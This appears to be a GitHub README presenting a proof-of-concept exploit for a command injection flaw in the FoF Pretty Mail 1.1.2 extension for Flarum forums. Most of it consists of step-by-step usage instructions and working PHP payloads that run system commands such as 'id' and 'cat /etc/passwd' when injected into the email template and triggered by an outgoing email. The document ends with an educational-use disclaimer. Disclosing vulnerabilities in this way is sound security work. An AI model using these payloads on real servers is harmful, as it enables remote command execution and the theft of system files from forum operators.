# Flarum FoF Pretty Mail Command Injection
Exploit for a command injection vulnerability in the FoF Pretty Mail extension (version 1.1.2) for Flarum, a popular open-source forum software. The vulnerability arises due to the unsafe handling of user input in the email template feature of the extension. <br>
An attacker with administrative access can exploit this vulnerability by injecting PHP code into the email template, leading to arbitrary command execution on the server. This could potentially compromise the security of the server and lead to unauthorized access or data exfiltration.

Usage:

1.    Log in as an administrator on the Flarum forum.
2.    Navigate to the FoF Pretty Mail extension settings.
3.    Edit the email default template and insert one of the following payloads at the end of the template:
        <?php system('echo "Take The Rose"; id'); ?>
        <?php system('echo "Take The Rose"; cat /etc/passwd'); ?>
 4.   Save the changes to the email template.
 5.   Trigger any action that sends an email, such as user registration or password reset.
    The recipient of the email will see the message "Take The Rose" followed by the output of the injected command (id or cat /etc/passwd) in the email content.
    

POC:

Editing the default email template
<br> 
Payload: 
```bash
 <?php system('echo "Take The Rose"; cat /etc/passwd'); ?>
```
<br>

![image](https://github.com/blue0x1/Flarum-FoF-Pretty-Mail-Command-Injection/assets/52697989/ca8e6852-7b30-43a0-bd3f-90e2d0898f24)


Per example triggered forgot password action for receiving a email 
<br>

![image](https://github.com/blue0x1/Flarum-FoF-Pretty-Mail-Command-Injection/assets/52697989/787a4959-8c01-4f5b-869d-4a6a0f9ffcf4)

<br> 
on the email, receiving:
<br> <br> 

![image](https://github.com/blue0x1/Flarum-FoF-Pretty-Mail-Command-Injection/assets/52697989/e2215324-2759-4d77-a672-3313bafc7a2e)


## Disclaimer:
<br>
This exploit is provided for educational purposes only. It is intended to promote awareness and improve the security of Flarum and its extensions. Use of this exploit for malicious purposes is strictly prohibited. Always ensure you have proper authorization before testing any system for vulnerabilities.
